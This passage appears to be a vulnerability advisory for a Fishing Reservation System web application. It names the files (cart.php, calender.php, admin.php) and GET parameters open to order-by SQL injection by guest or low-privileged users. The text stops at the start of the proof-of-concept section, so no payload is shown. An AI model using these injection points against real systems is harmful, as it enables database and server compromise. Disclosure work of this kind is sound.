Technical Details & Description:
================================
Multiple remote sql-injection web vulnerabilities has been discovered in
the official Fishing Reservation System application.
The vulnerability allows remote attackers to inject or execute own sql
commands to compromise the dbms or file system of the application.

The remote sql injection web vulnerabilites are located in the pid, type
and uid parameters of the admin.php control panel file. Guest accounts or
low privileged user accounts are able to inject and execute own
malicious sql commands as statement to compromise the local database and
affected
management system. The request method to inject/execute is GET and the
attack vector is client-side. The vulnerability is a classic order by
remote
sql injection web vulnerability.

Exploitation of the remote sql injection vulnerability requires no user
interaction and a low privileged web-application user / guest account.
Successful exploitation of the remote sql injection results in database
management system, web-server and web-application compromise.

Request Method(s):
[+] GET

Vulnerable File(s):
[+] cart.php
[+] calender.php
[+] admin.php

Vulnerable Parameter(s):
[+] uid
[+] pid
[+] type
[+] m
[+] y
[+] code


Proof of Concept (PoC):
=======================
The remote sql-injection web vulnerability can be exploited by remote
attackers with guest access or low privileged user account and without
user interaction action.
For security demonstration or to reproduce the remote sql injection web
vulnerability follow the provided information and steps below to continue.
